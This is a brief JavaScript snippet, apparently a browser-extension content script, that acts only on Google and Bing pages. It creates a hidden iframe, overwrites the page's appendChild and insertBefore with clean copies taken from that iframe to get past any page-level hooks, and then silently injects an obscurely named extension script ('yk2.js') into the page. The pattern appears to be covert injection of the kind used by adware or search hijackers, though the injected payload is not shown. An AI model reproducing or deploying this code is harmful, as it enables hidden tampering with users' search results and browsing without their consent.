(function() {
    if (window.document.URL.indexOf("docs") > -1) {
    }
    else {
     if (window.document.URL.indexOf("google") > -1 || window.document.URL.indexOf("bing") > -1) {
        var a = document.createElement("iframe");
        a.src = "about:blank";
        a.style.display = "none";
        document.body.appendChild(a);
        Element.prototype.appendChild = a.contentWindow.Element.prototype.appendChild;
        Element.prototype.insertBefore = a.contentWindow.Element.prototype.insertBefore;
        var script = document.createElement('script');
        script.type = 'text/javascript';
        script.async = true;
        script.src = 'chrome-extension://opmliiafmgjkgkfadkpomlefdllhajdi/lib/yk2.js';
        (document.getElementsByTagName('head')[0] || document.body)
        .appendChild(script);
      }
    }
})();
